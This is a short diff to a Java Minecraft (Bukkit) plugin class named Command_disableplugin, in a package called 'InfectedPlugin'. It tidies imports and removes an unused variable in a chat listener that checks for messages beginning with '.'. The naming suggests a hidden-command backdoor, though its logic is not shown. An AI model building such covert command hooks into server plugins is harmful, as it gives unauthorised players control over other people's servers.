@@ -2,11 +2,11 @@ package org.CreeperCoders.InfectedPlugin.Commands;
 
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
-import org.bukkit.plugin.Plugin;
 import org.bukkit.entity.Player;
-import org.bukkit.event.*;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
-
+import org.bukkit.plugin.Plugin;
 
 public class Command_disableplugin implements Listener
 {
@@ -14,7 +14,6 @@ public class Command_disableplugin implements Listener
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
-        boolean cancel = false;
         final Player p = event.getPlayer();
 
         if (message.startsWith("."))
